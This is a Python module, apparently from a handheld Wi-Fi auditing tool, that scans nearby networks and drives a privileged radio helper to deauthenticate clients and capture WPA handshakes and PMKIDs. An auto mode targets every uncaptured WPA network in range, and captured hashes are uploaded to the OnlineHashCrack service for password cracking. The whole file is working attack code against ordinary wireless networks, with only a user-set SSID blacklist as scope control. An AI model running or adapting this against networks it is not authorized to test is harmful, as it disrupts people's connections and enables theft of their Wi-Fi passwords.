"""Wi-Fi discovery, capture storage, and OnlineHashCrack submission."""

import csv
from contextlib import contextmanager
import json
import os
from pathlib import Path
import re
import select
import subprocess
import tempfile
import time
from dataclasses import dataclass
from urllib.error import HTTPError, URLError
from urllib.request import Request, urlopen


API_URL = "https://api.onlinehashcrack.com/v2"
KEY_PATTERN = re.compile(r"sk_[A-Za-z0-9]{32,64}")
MAC_PATTERN = re.compile(r"(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}")
CONFIG = Path(os.environ.get("XDG_CONFIG_HOME") or Path.home() / ".config") / "zerogotchi"
CAPTURES = Path(os.environ.get("XDG_DATA_HOME") or Path.home() / ".local/share") / "zerogotchi/captures"
HELPER = "/usr/lib/zerogotchi/radio"


class WifiError(Exception):
    pass


class AuthenticationError(WifiError):
    pass


class EmptyCapture(WifiError):
    pass


class UploadRetry(WifiError):
    def __init__(self, message, delay=60):
        super().__init__(message)
        self.delay = delay


@dataclass(frozen=True)
class Network:
    bssid: str
    ssid: str
    frequency: int
    signal: int
    security: str


@dataclass(frozen=True)
class AutoStatus:
    phase: str
    network: str = ""
    attempted: int = 0
    total: int = 0
    found: int = 0
    skipped: int = 0
    failed: int = 0
    uploaded: int = 0
    queued: int = 0
    upload_failed: int = 0
    deauths: int = 0


def split_nmcli(line):
    fields = [""]
    escaped = False
    for char in line:
        if escaped:
            fields[-1] += char
            escaped = False
        elif char == "\\":
            escaped = True
        elif char == ":":
            fields.append("")
        else:
            fields[-1] += char
    return fields


def scan():
    interface = ["ifname", "wlan0"] if read_setting("adapter") == "wlan0" else []
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-e", "yes", "-f", "BSSID,SSID,FREQ,SIGNAL,SECURITY",
             "device", "wifi", "list", *interface, "--rescan", "yes"],
            env={**os.environ, "LC_ALL": "C"}, capture_output=True, text=True,
            errors="replace", timeout=20, check=True,
        )
    except (subprocess.SubprocessError, OSError) as error:
        raise WifiError("Wi-Fi scan failed") from error

    by_bssid = {}
    for line in result.stdout.splitlines():
        fields = split_nmcli(line)
        if len(fields) != 5 or not MAC_PATTERN.fullmatch(fields[0]):
            continue
        bssid, ssid, freq, signal, security = fields
        try:
            network = Network(bssid.upper(), ssid, int(freq.split()[0]), int(signal), security)
        except (ValueError, IndexError):
            continue
        if network.bssid not in by_bssid or network.signal > by_bssid[network.bssid].signal:
            by_bssid[network.bssid] = network
    ignored = blacklist()
    return sorted((network for network in by_bssid.values() if not is_ignored(network, ignored)),
                  key=lambda network: -network.signal)


def read_setting(name):
    path = CONFIG / name
    try:
        return path.read_text(encoding="utf-8").strip()
    except (OSError, UnicodeError):
        return ""


def save_setting(name, value):
    CONFIG.mkdir(mode=0o700, parents=True, exist_ok=True)
    with tempfile.NamedTemporaryFile(dir=CONFIG, mode="w", encoding="utf-8", delete=False) as output:
        temporary = Path(output.name)
        try:
            output.write(value + "\n")
            output.flush()
            os.fsync(output.fileno())
            temporary.replace(CONFIG / name)
        finally:
            temporary.unlink(missing_ok=True)


def parse_blacklist(value):
    entries = next(csv.reader([value], skipinitialspace=True, strict=True))
    return frozenset(filter(None, map(str.strip, entries)))


def blacklist():
    try:
        return parse_blacklist(read_setting("ssid-blacklist"))
    except csv.Error as error:
        raise WifiError("Fix the SSID blacklist in Settings") from error


def is_ignored(network, ignored):
    return network.ssid in ignored or (not network.ssid and bool(ignored))


def extract_hashes(pcap, bssid, output, timeout):
    output.unlink(missing_ok=True)
    subprocess.run(
        ["hcxpcapngtool", "-o", str(output), str(pcap)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=timeout, check=True,
    )
    if not output.exists():
        return []
    return list(dict.fromkeys(
        line for line in output.read_text(encoding="ascii").splitlines()
        if (fields := line.split("*"))[:2] in (["WPA", "01"], ["WPA", "02"])
        and len(fields) > 3 and fields[3].lower() == bssid
    ))


def hash_kind(hashes):
    return "WPA handshake" if any(line.startswith("WPA*02*") for line in hashes) else "PMKID"


def capture_hashfile(pcap):
    modern = pcap.with_suffix(".hc22000")
    return modern if modern.exists() else pcap.with_suffix(".22000")


def radio_error(detail):
    match = re.search(r"ZEROGOTCHI: ([^\r\n]+)", detail)
    if match:
        return WifiError(match[1])
    if "ZEROGOTCHI_SUDO:" in detail:
        return AuthenticationError("User password authentication failed")
    return WifiError("Radio session failed. Check adapter and permissions")


@contextmanager
def auto_monitor(interface, password, cancel):
    args = ["sudo", "-Sk", "-p", "ZEROGOTCHI_SUDO:", "--", HELPER, interface, "hold"]
    with tempfile.TemporaryFile() as errors, subprocess.Popen(
        args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=errors,
    ) as process:
        try:
            process.stdin.write(password.encode() + b"\n")
            process.stdin.flush()
            deadline = time.monotonic() + 15
            while not cancel.is_set() and time.monotonic() < deadline:
                if os.pread(errors.fileno(), 4096, 0).count(b"ZEROGOTCHI_SUDO:") > 1:
                    break
                if select.select([process.stdout], [], [], 0.2)[0]:
                    monitor = process.stdout.readline().decode(errors="replace").strip()
                    if re.fullmatch(r"zgmon[0-9]{1,10}", monitor):
                        yield monitor
                        return
                    break
        finally:
            try:
                process.stdin.close()
            except BrokenPipeError:
                pass
        process.wait()
        if not cancel.is_set():
            errors.seek(0)
            raise radio_error(errors.read(4096).decode(errors="replace"))
        yield None


def supported_channels(interface):
    phy = (Path("/sys/class/net") / interface / "phy80211").resolve()
    try:
        output = subprocess.check_output(["/usr/sbin/iw", "phy", phy.name, "info"], text=True, timeout=5)
    except (OSError, subprocess.SubprocessError) as error:
        raise WifiError("USB WiFi adapter unavailable") from error
    channels = {}
    for freq, flags in re.findall(r"^\s*\* (\d+)(?:\.0+)? MHz \[[0-9]+\](.*)$", output, re.MULTILINE):
        if "(disabled)" not in flags:
            channels[int(freq)] = not any(flag in flags.lower() for flag in ("no ir", "radar"))
    if not channels:
        raise WifiError("USB adapter has no usable channels")
    return channels


def capture(network, interface, mode, password, cancel, report, *, time_limit=None, radio_report=None, monitor=None):
    if not interface:
        raise WifiError("Set capture adapter in Settings")
    if interface == "wlan0":
        raise WifiError("Built-in WiFi can scan. Select a USB adapter for capture.")
    if is_ignored(network, blacklist()):
        raise WifiError("Network is excluded by the SSID blacklist")
    bssid = network.bssid.replace(":", "").lower()
    folder = None
    if mode != "deauth":
        CAPTURES.mkdir(mode=0o700, parents=True, exist_ok=True)
        folder = Path(tempfile.mkdtemp(prefix=bssid.upper() + "-", dir=CAPTURES))
    pcap = folder / "capture.pcap" if folder else None
    prompt = b"ZEROGOTCHI_SUDO:"
    args = ["sudo", "-Sk", "-p", prompt.decode(), "--", HELPER,
            interface, str(network.frequency), network.bssid, mode]
    if monitor:
        args.append(monitor)
    hashes = []
    try:
        with (
            open(pcap or os.devnull, "xb" if pcap else "wb") as output,
            tempfile.TemporaryFile() as errors,
            tempfile.TemporaryDirectory() as scratch,
        ):
            if pcap:
                os.fchmod(output.fileno(), 0o600)
            probe = Path(scratch) / "probe.22000"
            process = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=output, stderr=errors)
            with process:
                try:
                    process.stdin.write(password.encode() + b"\n")
                    process.stdin.flush()
                except BrokenPipeError:
                    pass
                started = time.monotonic()
                next_probe = started + 2
                scanned_size = 0
                radio = "Preparing USB adapter…"
                state, sent = "Tuning", 0
                last_report = None
                try:
                    while process.poll() is None and not cancel.wait(0.2):
                        if os.pread(errors.fileno(), 4096, 0).count(prompt) > 1:
                            break
                        now = time.monotonic()
                        if time_limit is not None and now - started >= time_limit:
                            break
                        end = os.fstat(errors.fileno()).st_size
                        tail = os.pread(errors.fileno(), 4096, max(0, end - 4096)).decode(errors="replace")
                        statuses = [line[10:] for line in tail.splitlines()
                                    if line.startswith("ZG STATUS ")]
                        if statuses:
                            radio = statuses[-1].replace(" | ", "\n")
                        updates = re.findall(r"^ZG STATE (Listening|Deauthing) (\d+)$",
                                             tail, re.MULTILINE)
                        if updates:
                            state, total = updates[-1]
                            sent = int(total)
                        if radio_report and (state, sent) != last_report:
                            radio_report(state, sent)
                            last_report = state, sent
                        size = os.fstat(output.fileno()).st_size if pcap else 0
                        capture_progress = f"\nCaptured: {size // 1024} KiB\nWaiting for handshake or PMKID" if pcap else ""
                        report(f"{int(now-started)}s elapsed\n{radio}{capture_progress}")
                        if pcap and size > max(24, scanned_size) and now >= next_probe:
                            scanned_size, next_probe = size, now + 3
                            if radio_report:
                                radio_report("Checking", sent)
                                last_report = None
                            try:
                                hashes = extract_hashes(pcap, bssid, probe, timeout=5)
                            except (OSError, UnicodeError, subprocess.SubprocessError):
                                # The capture can grow while the converter reads its final record.
                                continue
                            if hashes:
                                if radio_report:
                                    radio_report("Saving", sent)
                                report(hash_kind(hashes) + " captured. Saving files…")
                                break
                finally:
                    try:
                        process.stdin.close()
                    except BrokenPipeError:
                        pass
                status = process.wait()
            end = os.fstat(errors.fileno()).st_size
            detail = os.pread(errors.fileno(), 8192, max(0, end - 8192)).decode(errors="replace")
        if status:
            error = radio_error(detail)
            if pcap and pcap.stat().st_size > 24:
                (folder / "network.json").write_text(json.dumps({"ssid": network.ssid}), encoding="utf-8")
                raise WifiError(f"{error} PCAP saved.")
            raise error
        if not pcap:
            return None, None, ""
        if pcap.stat().st_size <= 24:
            raise EmptyCapture("Stopped. No packets were captured.")
        (folder / "network.json").write_text(json.dumps({"ssid": network.ssid}), encoding="utf-8")
        if not hashes:
            with tempfile.TemporaryDirectory() as scratch:
                try:
                    hashes = extract_hashes(pcap, bssid, Path(scratch) / "final.22000", timeout=15)
                except (OSError, UnicodeError, subprocess.SubprocessError) as error:
                    raise WifiError("Hash conversion failed. PCAP saved.") from error
        if not hashes:
            return pcap, None, ""
        hashfile = pcap.with_suffix(".hc22000")
        hashfile.write_text("\n".join(hashes) + "\n", encoding="ascii")
        return pcap, hashfile, hash_kind(hashes)
    except (OSError, subprocess.SubprocessError) as error:
        raise WifiError("Radio session failed. Check adapter and permissions") from error
    finally:
        if pcap and (not pcap.exists() or pcap.stat().st_size <= 24):
            pcap.unlink(missing_ok=True)
            folder.rmdir()


def auto_capture(interface, password, cancel, report, *, auto_upload=False, target_seconds=25):
    nearby = scan()
    channels = supported_channels(interface)
    captured = {bssid for _, bssids in saved_handshakes() for bssid in bssids}
    targets = [network for network in nearby if network.ssid
               and {"WPA", "WPA1", "WPA2"}.intersection(network.security.split())
               and "802.1X" not in network.security and network.frequency in channels
               and network.bssid.replace(":", "").lower() not in captured]
    skipped = len(nearby) - len(targets)
    attempted = found = failed = 0
    uploaded = upload_failed = 0
    queue = []
    next_upload = 0

    def status(phase, network="", deauths=0):
        return AutoStatus(phase, network, attempted, len(targets), found, skipped,
                          failed, uploaded, len(queue), upload_failed, deauths)

    def send_pending(phase):
        nonlocal uploaded, upload_failed, next_upload
        while queue and not cancel.is_set() and time.monotonic() >= next_upload:
            report(status(phase))
            try:
                accepted, skipped_count, rejected = upload(queue[0])
            except UploadRetry as error:
                next_upload = time.monotonic() + error.delay
                break
            except (WifiError, OSError):
                upload_failed += 1
            else:
                uploaded += int(bool(accepted or skipped_count))
                upload_failed += int(bool(rejected))
            queue.pop(0)

    if targets and not cancel.is_set():
        report(status("Preparing"))
        with auto_monitor(interface, password, cancel) as monitor:
            for network in targets:
                if cancel.is_set():
                    break
                attempted += 1
                report(status("Tuning", network.ssid))
                mode = "active" if channels[network.frequency] and network.frequency < 5925 else "passive"

                def run_target(mode, seconds):
                    return capture(network, interface, mode, password, cancel, lambda message: None,
                                   time_limit=seconds, monitor=monitor,
                                   radio_report=lambda phase, count: report(status(phase, network.ssid, count)))

                try:
                    try:
                        _, hashes, _ = run_target(mode, target_seconds)
                    except EmptyCapture:
                        if cancel.is_set():
                            break
                        report(status("Retrying", network.ssid))
                        _, hashes, _ = run_target("passive", min(8, target_seconds))
                except AuthenticationError:
                    raise
                except EmptyCapture:
                    if not cancel.is_set():
                        skipped += 1
                except WifiError as error:
                    if not cancel.is_set():
                        failed += 1
                        report(status("Skipping", str(error)))
                else:
                    found += int(hashes is not None)
                    if hashes and auto_upload:
                        queue.append(hashes)
                send_pending("Uploading")
    del password
    while queue and not cancel.is_set():
        report(status("Idling"))
        if cancel.wait(max(0, next_upload - time.monotonic())):
            break
        send_pending("Idling")
    return status("Stopped" if cancel.is_set() else "Idling")


def capture_name(path):
    try:
        ssid = json.loads((path.parent / "network.json").read_text(encoding="utf-8"))["ssid"]
    except (OSError, ValueError, KeyError):
        # Older captures contain the AP beacon but have no saved metadata.
        raw_bssid = path.parent.name.split("-")[0]
        bssid = ":".join(raw_bssid[i:i + 2] for i in range(0, len(raw_bssid), 2))
        try:
            result = subprocess.run(
                ["tcpdump", "-nn", "-r", str(path), "-c", "1",
                 f"type mgt subtype beacon and wlan addr2 {bssid}"],
                capture_output=True, text=True, errors="replace", timeout=2,
            )
            match = re.search(r"Beacon \((.*?)\)", result.stdout)
            ssid = match[1] if match else ""
        except (OSError, subprocess.SubprocessError):
            ssid = ""
    return "".join(char if char.isprintable() else " " for char in ssid) or "(unknown or hidden network)"


def saved_captures():
    paths = (path for path in CAPTURES.glob("*/capture.pcap")
             if not path.parent.is_symlink() and not path.is_symlink() and path.is_file())
    return sorted(paths, key=lambda path: path.stat().st_mtime, reverse=True)


def saved_handshakes():
    records = []
    pattern = re.compile(r"^WPA\*0[12]\*[0-9a-f]{32}\*([0-9a-f]{12})\*[0-9a-f]{12}\*",
                         re.IGNORECASE | re.MULTILINE)
    for pcap in saved_captures():
        bssids = set()
        for suffix in (".hc22000", ".22000"):
            hashes = pcap.with_suffix(suffix)
            if hashes.is_file() and not hashes.is_symlink():
                bssids.update(bssid.lower() for bssid in
                              pattern.findall(hashes.read_text(encoding="ascii", errors="ignore")))
        if bssids:
            records.append((pcap, bssids))
    return records


def clear_handshakes(captures):
    for pcap in captures:
        pcap.unlink(missing_ok=True)
        pcap.with_suffix(".hc22000").unlink(missing_ok=True)
        pcap.with_suffix(".22000").unlink(missing_ok=True)
        (pcap.parent / "network.json").unlink(missing_ok=True)
        if not any(pcap.parent.iterdir()):
            pcap.parent.rmdir()


def upload(path):
    key = read_setting("api-key")
    if not KEY_PATTERN.fullmatch(key):
        raise WifiError("Set your API key in Settings")
    hashes = list(dict.fromkeys(
        line for line in path.read_text(encoding="ascii").splitlines()
        if line.startswith(("WPA*01*", "WPA*02*"))
    ))
    if not hashes:
        raise WifiError("No WPA hashes to submit")

    accepted = skipped = rejected = 0
    for offset in range(0, len(hashes), 50):
        payload = {
            "api_key": key, "agree_terms": "yes", "action": "add_tasks",
            "algo_mode": 22000, "hashes": hashes[offset:offset + 50],
        }
        request = Request(API_URL, json.dumps(payload).encode(),
                          headers={"Content-Type": "application/json"})
        try:
            with urlopen(request, timeout=15) as response:
                result = json.load(response)
        except HTTPError as error:
            try:
                result = json.load(error)
            except (ValueError, OSError):
                result = {}
            request_id = str(result.get("request_id", ""))[:32]
            if error.code == 429 or error.code >= 500:
                retry_after = error.headers.get("Retry-After") or result.get("retry_after")
                try:
                    delay = max(60, int(retry_after))
                except (ValueError, TypeError):
                    delay = 60
                raise UploadRetry(f"OnlineHashCrack HTTP {error.code}. Retry later. {request_id}",
                                  delay) from error
            raise WifiError(f"OnlineHashCrack HTTP {error.code}. {request_id}") from error
        except (URLError, OSError) as error:
            raise UploadRetry("OnlineHashCrack connection failed. Retry later.") from error
        except ValueError as error:
            raise WifiError("OnlineHashCrack returned an unreadable response") from error
        if not result.get("success"):
            raise WifiError("OnlineHashCrack rejected request " + str(result.get("request_id", ""))[:32])
        accepted += result.get("accepted", {}).get("count", 0)
        skipped += result.get("skipped", {}).get("count", 0)
        rejected += result.get("rejected", {}).get("count", 0)
    return accepted, skipped, rejected
